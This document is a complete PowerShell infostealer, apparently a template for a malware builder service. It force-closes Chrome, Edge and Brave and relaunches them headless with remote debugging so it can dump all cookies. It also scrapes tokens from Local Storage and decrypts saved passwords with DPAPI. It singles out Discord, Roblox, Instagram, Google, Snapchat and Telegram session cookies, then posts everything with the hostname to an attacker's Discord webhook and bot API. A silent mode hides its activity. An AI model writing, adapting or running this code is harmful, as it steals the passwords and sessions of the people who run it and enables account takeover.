# Template variables (replaced by build API)
$DISCORD_WEBHOOK_URL = '{{DISCORD_WEBHOOK_URL}}'
$BOT_API_URL = '{{BOT_API_URL}}'
$BOT_USER_ID = '{{BOT_USER_ID}}'
$TERMINAL_MODE = '{{TERMINAL_MODE}}'
$TERMINAL_CUSTOM_MESSAGE = '{{TERMINAL_CUSTOM_MESSAGE}}'

$DEBUG_PORT = 9222
$DEBUG_URL = "http://localhost:${DEBUG_PORT}/json"

# Browser configurations
$BROWSERS = @{
    'chrome' = @{
        bin = "$env:PROGRAMFILES\Google\Chrome\Application\chrome.exe"
        user_data = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    }
    'edge' = @{
        bin = "${env:ProgramFiles(x86)}\Microsoft\Edge\Application\msedge.exe"
        user_data = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    }
    'brave' = @{
        bin = "$env:PROGRAMFILES\BraveSoftware\Brave-Browser\Application\brave.exe"
        user_data = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    }
}

# Logging function
function Log-Output {
    param(
        [string]$Message,
        [switch]$IsError
    )

    if ($TERMINAL_MODE -eq 'silent') {
        return
    } elseif ($TERMINAL_MODE -eq 'default') {
        Write-Host $Message
    } elseif ($TERMINAL_MODE -eq 'custom' -and $IsError) {
        if ($TERMINAL_CUSTOM_MESSAGE -and $TERMINAL_CUSTOM_MESSAGE -ne '{{TERMINAL_CUSTOM_MESSAGE}}') {
            Write-Host $TERMINAL_CUSTOM_MESSAGE
        }
    }
}

# Close browser processes and wait for port to be released
function Close-Browser {
    param([string]$BaseName)

    @($BaseName, 'chrome', 'msedge', 'brave') | ForEach-Object {
        Stop-Process -Name $_ -Force -ErrorAction SilentlyContinue
    }

    # Wait for port 9222 to be fully released before returning
    $waited = 0
    while ($waited -lt 5000) {
        Start-Sleep -Milliseconds 500
        $waited += 500
        try {
            $conn = [System.Net.Sockets.TcpClient]::new()
            $result = $conn.BeginConnect('127.0.0.1', $DEBUG_PORT, $null, $null)
            $connected = $result.AsyncWaitHandle.WaitOne(200, $false)
            $conn.Close()
            if (-not $connected) { break }  # Port is free
        } catch { break }  # Port is free (connection refused)
    }
}

# Start browser with debug port
function Start-BrowserDebug {
    param(
        [string]$BinPath,
        [string]$UserDataPath
    )

    $psi = [System.Diagnostics.ProcessStartInfo]::new()
    $psi.FileName = $BinPath
    $psi.Arguments = "--restore-last-session --remote-debugging-port=$DEBUG_PORT --remote-allow-origins=* --headless --user-data-dir=`"$UserDataPath`""
    $psi.UseShellExecute = $false
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.CreateNoWindow = $true

    [System.Diagnostics.Process]::Start($psi) | Out-Null
    Start-Sleep -Seconds 3
}

# Get page WebSocket URL (triggers browser to initialize page target)
function Get-PageWsUrl {
    $maxRetries = 10
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            $response = Invoke-RestMethod -Uri $DEBUG_URL -TimeoutSec 5 -ErrorAction SilentlyContinue
            if ($response) {
                foreach ($item in $response) {
                    if ($item.type -eq 'page' -and $item.webSocketDebuggerUrl) {
                        return $item.webSocketDebuggerUrl
                    }
                }
                if ($response[0].webSocketDebuggerUrl) {
                    return $response[0].webSocketDebuggerUrl
                }
            }
        } catch {}
        $retryCount++
        Start-Sleep -Milliseconds 500
    }
    return $null
}

# Get Chrome DevTools Protocol WebSocket URL
function Get-DebugWsUrl {
    $maxRetries = 15
    $retryCount = 0

    while ($retryCount -lt $maxRetries) {
        try {
            $response = Invoke-RestMethod -Uri $DEBUG_URL -TimeoutSec 5 -ErrorAction SilentlyContinue
            if ($response -and $response[0].webSocketDebuggerUrl) {
                Log-Output "[+] Connected to Chrome DevTools Protocol"
                return $response[0].webSocketDebuggerUrl
            }
        } catch {}

        $retryCount++
        Start-Sleep -Milliseconds 500
    }

    Log-Output "[!] Failed to connect to debug endpoint after $maxRetries attempts" -IsError
    return $null
}

# Invoke CDP command via WebSocket
function Invoke-CdpCommand {
    param(
        [string]$WsUrl,
        [string]$Method,
        [int]$Id = 1
    )

    try {
        $ws = [System.Net.WebSockets.ClientWebSocket]::new()
        $cts = [System.Threading.CancellationTokenSource]::new()

        $uriObj = [Uri]::new($WsUrl)
        $connectTask = $ws.ConnectAsync($uriObj, $cts.Token)
        $connectTask.Wait(5000) | Out-Null

        if ($ws.State -ne [System.Net.WebSockets.WebSocketState]::Open) {
            throw "WebSocket connection failed"
        }

        # Send command (CDP format: {"id":1,"method":"Network.getAllCookies"})
        $cmd = "{`"id`":$Id,`"method`":`"$Method`"}"
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($cmd)
        $segment = [System.ArraySegment[byte]]::new($bytes)
        $sendTask = $ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token)
        $sendTask.Wait(5000) | Out-Null

        # Receive response
        $buffer = [byte[]]::new(10MB)
        $received = [System.Collections.Generic.List[byte]]::new()
        $endOfMessage = $false

        while (-not $endOfMessage) {
            $segment = [System.ArraySegment[byte]]::new($buffer)
            $recvTask = $ws.ReceiveAsync($segment, $cts.Token)
            $recvTask.Wait(10000) | Out-Null
            $result = $recvTask.Result

            if ($result.Count -gt 0) {
                for ($j = 0; $j -lt $result.Count; $j++) {
                    $received.Add($buffer[$j]) | Out-Null
                }
            }
            $endOfMessage = $result.EndOfMessage
        }

        $closeTask = $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, '', $cts.Token)
        $closeTask.Wait(5000) | Out-Null
        $ws.Dispose()

        return [System.Text.Encoding]::UTF8.GetString($received.ToArray())

    } catch {
        Log-Output "[!] CDP command failed: $_" -IsError
        return $null
    }
}

# Get all cookies from Chrome
function Get-AllCookies {
    param([string]$WsUrl)

    Log-Output "[*] Fetching cookies via CDP..."
    $response = Invoke-CdpCommand -WsUrl $WsUrl -Method 'Network.getAllCookies' -Id 1

    if ($response) {
        try {
            $data = $response | ConvertFrom-Json -ErrorAction Stop
            if ($data -and $data.result -and $data.result.cookies) {
                Log-Output "[+] Found $($data.result.cookies.Count) cookies"
                return $data.result.cookies
            }
        } catch {
            Log-Output "[!] Failed to parse CDP response: $_" -IsError
        }
    }

    return @()
}

# Format cookies as text
function Format-CookiesAsText {
    param(
        [string]$BrowserName,
        [object[]]$Cookies
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Cookies".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| Total: $($Cookies.Count) cookies".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    for ($i = 0; $i -lt $Cookies.Count; $i++) {
        $c = $Cookies[$i]
        $lines += ""
        $lines += "| [$($i+1)] $($c.name)"
        $lines += "|     Domain:   $($c.domain)"

        $val = if ($c.value) { $c.value } else { "" }
        if ($val.Length -gt 100) {
            $val = $val.Substring(0, 100) + "..."
        }
        $lines += "|     Value:    $val"
        $lines += "|     Secure:   $($c.secure)  HttpOnly: $($c.httpOnly)"
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Filter high-value cookies (Discord, Roblox, etc.)
function Get-HighValueCookies {
    param([object[]]$Cookies)

    $targetCookies = @{
        'discord' = @('token', 'discord_token')
        'roblox' = @('rbxauthticket', 'roblox')
        'instagram' = @('sessionid', 'ig_user', 'ig_did')
        'google' = @('__secure-1psidts', '__secure-3psid', 'sid')
        'snapchat' = @('snap_token', 'snap_session')
        'telegram' = @('auth_token', 'session_key')
    }

    $highValue = @()

    foreach ($cookie in $Cookies) {
        $cookieLower = $cookie.name.ToLower()

        # Check for JWT tokens
        if ($cookie.value -match '^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$') {
            $highValue += @{
                type = 'JWT'
                name = $cookie.name
                value = $cookie.value.Substring(0, [Math]::Min(100, $cookie.value.Length)) + '...'
                domain = $cookie.domain
            }
        }

        # Check for target cookies
        foreach ($target in $targetCookies.Keys) {
            foreach ($keyword in $targetCookies[$target]) {
                if ($cookieLower -like "*$keyword*") {
                    $highValue += @{
                        type = $target.ToUpper()
                        name = $cookie.name
                        value = $cookie.value.Substring(0, [Math]::Min(100, $cookie.value.Length))
                        domain = $cookie.domain
                    }
                    break
                }
            }
        }
    }

    return $highValue
}

# Format high-value cookies as text
function Format-HighValueCookiesAsText {
    param([object[]]$HighValueCookies)

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| HIGH-VALUE AUTHENTICATION COOKIES".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($HighValueCookies.Count -eq 0) {
        $lines += "| No high-value cookies found".PadRight(68) + "|"
    } else {
        for ($i = 0; $i -lt $HighValueCookies.Count; $i++) {
            $c = $HighValueCookies[$i]
            $lines += ""
            $lines += "| [$($i+1)] $($c.type)"
            $lines += "|     Cookie: $($c.name)"
            $lines += "|     Domain: $($c.domain)"
            $lines += "|     Value:  $($c.value)"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Extract Local Storage from browsers
function Get-LocalStorage {
    param(
        [string]$BrowserName,
        [string]$UserDataPath
    )

    $localStorage = @{}
    $localStoragePath = Join-Path $UserDataPath "Default\Local Storage\leveldb"

    if (-not (Test-Path $localStoragePath)) {
        return $localStorage
    }

    try {
        # Get all leveldb files
        $files = Get-ChildItem -Path $localStoragePath -Filter "*.ldb" -ErrorAction SilentlyContinue

        foreach ($file in $files) {
            try {
                $content = [System.IO.File]::ReadAllBytes($file.FullName)
                $text = [System.Text.Encoding]::UTF8.GetString($content)

                # Extract readable strings (looking for URLs and tokens)
                $strings = [regex]::Matches($text, '[a-zA-Z0-9_\-\.]{20,}') | ForEach-Object { $_.Value }

                foreach ($str in $strings) {
                    if ($str -match '(token|auth|key|secret|password|api)' -or $str -match '^[a-zA-Z0-9_\-]{40,}$') {
                        $localStorage[$str] = $file.Name
                    }
                }
            } catch {}
        }
    } catch {}

    return $localStorage
}

# Extract passwords using DPAPI decryption
function Get-SavedPasswords {
    param(
        [string]$BrowserName,
        [string]$UserDataPath
    )

    $passwords = @()
    $loginDataPath = Join-Path $UserDataPath "Default\Login Data"

    Log-Output "[*] Looking for Login Data at: $loginDataPath"
    Log-Output "[*] User Data path: $UserDataPath"

    if (-not (Test-Path $loginDataPath)) {
        Log-Output "[!] No Login Data database found for $BrowserName at $loginDataPath" -IsError
        return $passwords
    }

    Log-Output "[+] Found Login Data file for $BrowserName"

    try {
        # Verify Login Data path exists
        if (-not (Test-Path $loginDataPath)) {
            Log-Output "[!] Login Data file not found at: $loginDataPath" -IsError
            return $passwords
        }

        # Copy database to temp (Chrome locks it when running)
        $tmpDb = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', '.db'
        try {
            [System.IO.File]::Copy($loginDataPath, $tmpDb, $true) | Out-Null
            Log-Output "[*] Copied Login Data to temp: $tmpDb"
        } catch {
            Log-Output "[!] Failed to copy Login Data: $_" -IsError
            return $passwords
        }

        # Load SQLite assembly if available, otherwise parse binary
        $query = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"

        try {
            # Try using SQLite if available
            Log-Output "[*] Attempting SQLite query..."
            Add-Type -Path "C:\Program Files\SQLite\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
            $conn = New-Object System.Data.SQLite.SQLiteConnection
            $conn.ConnectionString = "Data Source=$tmpDb"
            $conn.Open()

            $cmd = $conn.CreateCommand()
            $cmd.CommandText = $query
            $reader = $cmd.ExecuteReader()

            $decryptedCount = 0
            while ($reader.Read()) {
                try {
                    $encryptedPassword = $reader["password_value"]
                    $decryptedPassword = Decrypt-DPAPIPassword -EncryptedData $encryptedPassword

                    if ($decryptedPassword) {
                        $passwords += @{
                            site = $reader["origin_url"]
                            username = $reader["username_value"]
                            password = $decryptedPassword
                        }
                        $decryptedCount++
                    }
                } catch {
                    Log-Output "[!] Failed to decrypt password for site: $_" -IsError
                }
            }

            $conn.Close()
            Log-Output "[+] Successfully extracted $decryptedCount password(s) from $BrowserName"
        } catch {
            Log-Output "[!] SQLite query failed: $_" -IsError
            Log-Output "[*] Attempting fallback binary database parsing..."

            # Fallback: Try to extract from binary database
            if (-not (Test-Path $tmpDb)) {
                Log-Output "[!] Temp database file not found: $tmpDb" -IsError
                return $passwords
            }

            try {
                $dbContent = [System.IO.File]::ReadAllBytes($tmpDb)
                $dbText = [System.Text.Encoding]::UTF8.GetString($dbContent)

                # Look for URL patterns and adjacent encrypted blobs
                $urlMatches = [regex]::Matches($dbText, 'https?://[^\x00]{1,100}')
                foreach ($match in $urlMatches) {
                    $passwords += @{
                        site = $match.Value -replace '[^\x20-\x7E]', ''  # Remove non-printable chars
                        username = "encrypted"
                        password = "requires_decryption"
                    }
                }

                Log-Output "[*] Fallback: Found $($urlMatches.Count) encrypted entries (requires manual decryption)"
            } catch {
                Log-Output "[!] Fallback parsing also failed: $_" -IsError
            }
        }

        Remove-Item $tmpDb -Force -ErrorAction SilentlyContinue
    } catch {
        Log-Output "[!] Password extraction failed for $BrowserName : $_" -IsError
    }

    return $passwords
}

# Decrypt DPAPI-protected password
function Decrypt-DPAPIPassword {
    param(
        [byte[]]$EncryptedData
    )

    try {
        # DPAPI encrypted data for Chrome starts with "v10" or "v11" header
        if ($EncryptedData.Count -lt 4) {
            Log-Output "[!] Invalid encrypted data (too short): $($EncryptedData.Count) bytes" -IsError
            return $null
        }

        # Skip version header (first 3 bytes "v10" or "v11")
        $encryptedPayload = $EncryptedData[3..($EncryptedData.Count - 1)]

        # Use DPAPI to decrypt (requires running as the user whose credentials are encrypted)
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedPayload,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )

        # Convert decrypted bytes to string
        $decryptedPassword = [System.Text.Encoding]::UTF8.GetString($decrypted)
        return $decryptedPassword
    } catch {
        Log-Output "[!] DPAPI decryption error: $_" -IsError
        return $null
    }
}

# Format passwords as text
function Format-PasswordsAsText {
    param(
        [string]$BrowserName,
        [array]$Passwords
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Saved Passwords".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($Passwords.Count -eq 0) {
        $lines += "| No saved passwords found".PadRight(68) + "|"
    } else {
        for ($i = 0; $i -lt $Passwords.Count; $i++) {
            $p = $Passwords[$i]
            $lines += ""
            $lines += "| [$($i+1)] $($p.site)"
            $lines += "|     Username: $($p.username)"

            $pwd = if ($p.password) { $p.password } else { "encrypted" }
            if ($pwd.Length -gt 60) {
                $pwd = $pwd.Substring(0, 60) + "..."
            }
            $lines += "|     Password: $pwd"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Format Local Storage as text
function Format-LocalStorageAsText {
    param(
        [string]$BrowserName,
        [hashtable]$LocalStorage
    )

    $lines = @()
    $lines += "+----------------------------------------------------------------------+"
    $lines += "| $($BrowserName.ToUpper()) - Local Storage".PadRight(68) + "|"
    $lines += "+----------------------------------------------------------------------+"

    if ($LocalStorage.Count -eq 0) {
        $lines += "| No Local Storage data found".PadRight(68) + "|"
    } else {
        $count = 0
        foreach ($key in $LocalStorage.Keys) {
            $count++
            $val = $key
            if ($val.Length -gt 60) {
                $val = $val.Substring(0, 60) + "..."
            }
            $lines += "| [$count] $val"
            $lines += "|     Source: $($LocalStorage[$key])"
        }
    }

    $lines += "|"
    $lines += "+----------------------------------------------------------------------+"

    return $lines -join "`n"
}

# Send to Discord webhook with per-browser files
function Send-ToDiscordWebhook {
    param(
        [hashtable]$AllResults,
        [string]$WebhookUrl
    )

    if (-not $WebhookUrl -or $WebhookUrl.StartsWith('{{')) {
        Log-Output "[!] Discord webhook not configured" -IsError
        return $false
    }

    try {
        $successCount = 0

        # Send separate webhook message for each browser
        foreach ($browserName in $AllResults.Keys) {
            $browserData = $AllResults[$browserName]
            $fileContent = ""

            # Add passwords section first
            if ($browserData.passwords.Count -gt 0) {
                $fileContent += (Format-PasswordsAsText -BrowserName $browserName -Passwords $browserData.passwords) + "`n`n"
            }

            # Add cookies section
            if ($browserData.cookies.Count -gt 0) {
                $fileContent += (Format-CookiesAsText -BrowserName $browserName -Cookies $browserData.cookies) + "`n`n"

                # Add high-value cookies subsection
                $highValue = Get-HighValueCookies -Cookies $browserData.cookies
                if ($highValue.Count -gt 0) {
                    $fileContent += (Format-HighValueCookiesAsText -HighValueCookies $highValue) + "`n`n"
                }
            }

            # Add localStorage section
            if ($browserData.localStorage.Count -gt 0) {
                $fileContent += (Format-LocalStorageAsText -BrowserName $browserName -LocalStorage $browserData.localStorage) + "`n`n"
            }

            # If no data, still send notification
            if ([string]::IsNullOrWhiteSpace($fileContent)) {
                $fileContent = "[$([DateTime]::Now)] No credentials extracted for $browserName"
            }

            # Write content to temp file
            $tmpFile = [System.IO.Path]::GetTempFileName() -replace '\.tmp$', ".txt"
            [System.IO.File]::WriteAllText($tmpFile, $fileContent, [System.Text.Encoding]::UTF8)

            try {
                # Use .NET's MultipartFormDataContent for proper multipart handling
                $httpClient = New-Object System.Net.Http.HttpClient
                $multipartContent = New-Object System.Net.Http.MultipartFormDataContent

                # Add message content
                $messageText = "**$browserName Credentials**"
                $stringContent = New-Object System.Net.Http.StringContent($messageText, [System.Text.Encoding]::UTF8, "text/plain")
                $multipartContent.Add($stringContent, "content")

                # Add file
                $fileBytes = [System.IO.File]::ReadAllBytes($tmpFile)
                $fileName = "$browserName-credentials.txt"
                $fileStream = New-Object System.IO.MemoryStream(,$fileBytes)
                $streamContent = New-Object System.Net.Http.StreamContent($fileStream)
                $streamContent.Headers.ContentType = "text/plain"
                $multipartContent.Add($streamContent, "file", $fileName)

                # Send request
                $response = $httpClient.PostAsync($WebhookUrl, $multipartContent).Result

                if ($response.StatusCode -eq "OK" -or $response.StatusCode -eq "NoContent" -or [int]$response.StatusCode -eq 200 -or [int]$response.StatusCode -eq 204) {
                    Log-Output "[+] Sent ${browserName} credentials to Discord webhook"
                    $successCount++
                } else {
                    Log-Output "[!] Failed to send ${browserName}: HTTP $($response.StatusCode)" -IsError
                }

                $streamContent.Dispose()
                $httpClient.Dispose()

            } finally {
                Remove-Item $tmpFile -Force -ErrorAction SilentlyContinue
            }
        }

        if ($successCount -gt 0) {
            Log-Output "[+] Successfully sent $successCount file(s) to Discord webhook"
            return $true
        } else {
            Log-Output "[!] Failed to send any files to Discord webhook" -IsError
            return $false
        }

    } catch {
        Log-Output "[!] Failed to send to Discord: $_" -IsError
        return $false
    }
}

# Send credentials to Discord bot API
function Send-ToBotApi {
    param(
        [hashtable]$AllResults,
        [string]$ApiUrl,
        [string]$UserId
    )

    if (-not $ApiUrl -or $ApiUrl.StartsWith('{{')) {
        Log-Output "[!] Bot API URL not configured" -IsError
        return $false
    }

    if (-not $UserId -or $UserId.StartsWith('{{')) {
        Log-Output "[!] Bot User ID not configured" -IsError
        return $false
    }

    try {
        # Get hostname
        $hostname = [System.Net.Dns]::GetHostName()

        # Build list of all passwords and cookies across all browsers
        $allPasswords = @()
        $allCookies = @()
        $allLocalStorage = @{}

        foreach ($browserName in $AllResults.Keys) {
            $browserData = $AllResults[$browserName]

            # Add passwords
            if ($browserData.passwords -and $browserData.passwords.Count -gt 0) {
                foreach ($pwd in $browserData.passwords) {
                    $allPasswords += $pwd
                }
            }

            # Add cookies
            if ($browserData.cookies -and $browserData.cookies.Count -gt 0) {
                foreach ($cookie in $browserData.cookies) {
                    $allCookies += $cookie
                }
            }

            # Add localStorage
            if ($browserData.localStorage) {
                foreach ($key in $browserData.localStorage.Keys) {
                    $allLocalStorage[$key] = $browserData.localStorage[$key]
                }
            }
        }

        # Build JSON payload
        $payload = @{
            user_id = $UserId
            hostname = $hostname
            passwords = $allPasswords
            cookies = $allCookies
            localStorage = $allLocalStorage
        }

        $jsonPayload = ConvertTo-Json -InputObject $payload -Depth 10
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonPayload)

        # Send to bot API
        $response = Invoke-WebRequest -Uri $ApiUrl -Method Post -Body $bodyBytes -ContentType "application/json" -TimeoutSec 30 -ErrorAction Stop

        Log-Output "[+] Successfully sent to Discord bot API"
        return $true

    } catch {
        Log-Output "[!] Failed to send to Discord bot: $_" -IsError
        return $false
    }
}

# Main extraction loop
function Main {
    Log-Output "==============================================="
    Log-Output "Browser Credential Extractor (PowerShell/CDP)"
    Log-Output "==============================================="

    $allResults = @{}

    foreach ($browserName in $BROWSERS.Keys) {
        $config = $BROWSERS[$browserName]

        if (-not (Test-Path -Path $config.bin)) {
            Log-Output "[$([string]::Format('{0,6}', $browserName.ToUpper()))] Not installed"
            continue
        }

        Log-Output ""
        Log-Output "[$([string]::Format('{0,6}', $browserName.ToUpper()))] Extracting credentials..."

        # Close any existing instances for clean state
        $baseName = [System.IO.Path]::GetFileNameWithoutExtension($config.bin)
        Close-Browser -BaseName $baseName

        # Start browser with debug port
        Log-Output "[*] Starting browser with debug port..."
        Start-BrowserDebug -BinPath $config.bin -UserDataPath $config.user_data

        # Get browser-level WebSocket URL (matches Python: get_debug_ws_url())
        $wsUrl = Get-DebugWsUrl
        # Also trigger page target init like Python does: get_page_ws_url()
        Get-PageWsUrl | Out-Null

        if (-not $wsUrl) {
            Log-Output "[!] Failed to connect to browser"
            continue
        }

        # Extract cookies
        $cookies = Get-AllCookies -WsUrl $wsUrl

        # Extract Local Storage (do this while browser is still running)
        Log-Output "[*] Extracting Local Storage..."
        $localStorage = Get-LocalStorage -BrowserName $browserName -UserDataPath $config.user_data

        # Extract saved passwords
        Log-Output "[*] Extracting saved passwords..."
        $passwords = Get-SavedPasswords -BrowserName $browserName -UserDataPath $config.user_data

        # Store all data for this browser
        $allResults[$browserName] = @{
            cookies = $cookies
            localStorage = $localStorage
            passwords = $passwords
        }

        # Close browser after extraction
        Close-Browser -BaseName $baseName
    }

    # Add summary
    Log-Output ""
    Log-Output "==============================================="
    Log-Output "EXTRACTION SUMMARY"
    Log-Output "==============================================="
    foreach ($browser in $allResults.Keys) {
        $cookieCount = $allResults[$browser].cookies.Count
        $passwordCount = $allResults[$browser].passwords.Count
        $storageCount = $allResults[$browser].localStorage.Count
        Log-Output "$($browser.PadRight(10)) : $cookieCount cookies, $passwordCount passwords, $storageCount storage items"
    }
    Log-Output "==============================================="

    # Send to Discord webhook
    Log-Output ""
    if ($allResults.Count -gt 0) {
        $hasData = $false
        foreach ($browser in $allResults.Keys) {
            if ($allResults[$browser].cookies.Count -gt 0 -or $allResults[$browser].passwords.Count -gt 0 -or $allResults[$browser].localStorage.Count -gt 0) {
                $hasData = $true
                break
            }
        }

        if ($hasData) {
            # Send to Discord webhook if configured
            if ($DISCORD_WEBHOOK_URL -and -not $DISCORD_WEBHOOK_URL.StartsWith('{{')) {
                Send-ToDiscordWebhook -AllResults $allResults -WebhookUrl $DISCORD_WEBHOOK_URL
            }

            # Send to Bot API if configured
            if ($BOT_API_URL -and -not $BOT_API_URL.StartsWith('{{')) {
                Send-ToBotApi -AllResults $allResults -ApiUrl $BOT_API_URL -UserId $BOT_USER_ID
            }
        } else {
            Log-Output "[!] No credentials extracted"
        }
    } else {
        Log-Output "[!] No browsers processed"
    }
}

# Run main function
Main
